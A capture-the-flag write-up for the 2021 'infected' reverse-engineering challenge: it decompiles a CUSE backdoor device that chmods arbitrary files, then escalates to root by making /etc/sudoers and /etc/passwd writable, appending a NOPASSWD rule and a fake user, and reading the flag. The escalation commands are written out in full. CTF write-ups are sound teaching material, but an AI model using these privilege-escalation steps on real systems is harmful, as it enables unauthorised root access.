---
tags: reverse
year: 2021
authors: crit, ttmx
---

# infected

We were given the binary and told that the host was running it,
we just needed to use it.

## Reversing

So, this was definitely not in my comfort zone,
in fact it was just at the limit for my limited experience with reverse.

### What is it?

Opening up `main` we only see `register_backdoor`. Looking into it, we see `cuse_lowlevel_main`.

```
0x00000d1d      lea     rcx, devops ; 0x201d00
0x00000d24      mov     edi, eax
0x00000d26      call    cuse_lowlevel_main ; sym.imp.cuse_lowlevel_main
```

Following `devops` we get:
```
...
0x00201d14      add     byte [rax], al
0x00201d16      add     byte [rax], al
0x00201d18      .qword 0x0000000000000a9a ; sym.backdoor_open
0x00201d20      add     byte [rax], al
0x00201d22      add     byte [rax], al
0x00201d24      add     byte [rax], al
0x00201d26      add     byte [rax], al
0x00201d28      .qword 0x0000000000000ac0 ; sym.backdoor_write; RELOC 64
0x00201d30      add     byte [rax], al
0x00201d32      add     byte [rax], al
...
```

So now we just need to check those two.
`backdoor_open` simply acts as a wrapper to `fuse_reply_open`,
while `backdoor_write` is more complex.

A quick Google search reveals to me that `fuse` stands for *Filesystem in Userspace*.
Looking further into it, I read:

> This device is the primary interface between the FUSE filesystem driver and a user-space process wishing to provide the filesystem (referred to in the rest of this manual page as the filesystem daemon).

```
$ ls /dev
/dev/backdoor
...
```

Bingo!

### Finding out more

I kept reversing the binary and found out that there were three calls to `strtok`:
```c
iVar4 = strtok(iVar3, 0xe20);
arg1_00 = strtok(0, 0xe20);
iVar5 = strtok(0, 0xe20);
```
This means the input is split by a token stored at address `0xe20` which turned out to be `:`.

Afterwards we have:
```c
iVar1 = strncmp(iVar4, 0xe22, 8);
if (iVar1 == 0) {
    stat64(arg1_00, (int64_t)&var_a0h);
    if (((uint32_t)var_88h & 0xf000) == 0x8000) {
        uVar2 = atoi(iVar5);
        iVar1 = chmod(arg1_00, uVar2, uVar2);
        if (iVar1 == 0) {
            fuse_reply_write(arg1, arg3, arg3);
            goto code_r0x00000c7d;
        }
    }
    fuse_reply_err(arg1, 0x16);
} else {
    fuse_reply_err(arg1, 0x16);
}
```

The first part was compared to 8 bytes stored at `0xe22`, these were `b4ckd00r`.
The second part was passed in to `stat64`, I assumed it was to check for file existence.
And finally, the third part it was converted to an `int` and then passed to `chmod`.

So our binary would receive a string for format `b4ckd00r:file:perms`,
and apply `chmod` to the passed file.

## Pwning the backdoor

Oh, it's just a `chmod`, that's easy.
I check if there are any `crontabs` I could exploit, but find none.
I check if sudo is available, and it is! Time to `chmod` the `/etc/sudoers` file and get root that way.

```bash
echo "b4ckd00r:/etc/sudoers:777" > /dev/backdoor
```

Now we try to write to it... But we can't?
Oh, the perms are all messed up, that's totally not 777.

```sh
$ ls -l /etc/sudoers
------x--x
```

Hmmm, lets investigate this further.
Lets make a random file at `/tmp/t` and see if I can understand the perms.

```sh
$ echo "b4ckd00r:/tmp/t:2" > /dev/backdoor
# resulted in --------w-
$ echo "b4ckd00r:/tmp/t:3" > /dev/backdoor
# resulted in --------wx
```

Oh, I know this pattern, its just binary. That's probably the default behavior, I just did not know about it.

`1111111111` binary to decimal is `1023`, lets try that.

```sh
$ echo "b4ckd00r:/tmp/t:1023" > /dev/backdoor
# .rwxrwxrwx
```

That looks good! Lets use it on the real one.

```sh
$ echo "b4ckd00r:/etc/sudoers:1023" > /dev/backdoor
```

Now with the chmoded file we need to add something to let us use sudo... What about all commands without any password? Seems safe.

```sh
$ echo "ALL ALL=(ALL) NOPASSWD: ALL">>/etc/sudoers
```

It didn't error out!

Sudo requires the permissions on `/etc/sudoers` to not be writable by everyone, so we just revert that.
It also requires us to be on the user list, which we are not, we just have `uid 1000`, but no user.

```sh
$ echo "b4ckd00r:/etc/sudoers:448" > /dev/backdoor
```

Sudo perms fixed, onto adding a user, with `uid 1000` and a random name.
```sh
$ echo "b4ckd00r:/etc/passwd:1023" > /dev/backdoor
$ echo "heck:x:1000:1000:heck:/root:/bin/sh">>/etc/passwd
$ sudo /bin/ls /root
flag-b40d08b2f732b94d5ba34730c052d7e3.txt
$ sudo /bin/cat /root/flag-b40d08b2f732b94d5ba34730c052d7e3.txt
zer0pts{exCUSE_m3_bu7_d0_u_m1nd_0p3n1ng_7h3_b4ckd00r?}
```
And there's the flag!